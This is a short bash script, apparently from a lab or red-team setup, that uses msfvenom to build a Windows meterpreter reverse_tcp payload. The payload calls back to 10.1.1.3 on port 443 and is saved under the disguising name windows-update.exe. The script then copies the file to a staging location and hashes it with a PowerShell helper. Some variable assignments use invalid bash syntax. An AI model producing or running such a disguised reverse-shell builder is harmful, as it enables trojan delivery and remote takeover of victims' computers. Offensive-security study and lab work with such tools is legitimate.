#/bin/bash

if ! command -v pwsh &> /dev/null; then
        sudo apt install powershell
fi

$FILE1=windows-update.exe
$FILE2=../../windows-update.exe
$FILE3=./sha256

if test -f "$FILE1"; then 
        sudo rm $FILE1
fi

if test -f "$FILE2"; then
        sudo rm $FILE2
fi

sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.3 LPORT=443 -f exe > windows-update.exe
sudo cp windows-update.exe ../../windows-update.exe

if test -f "$FILE3"; then
        sudo rm $FILE3
fi

sudo openssl dgst -sha256 windows-update.exe > sha256
sudo pwsh out-sha256.ps1
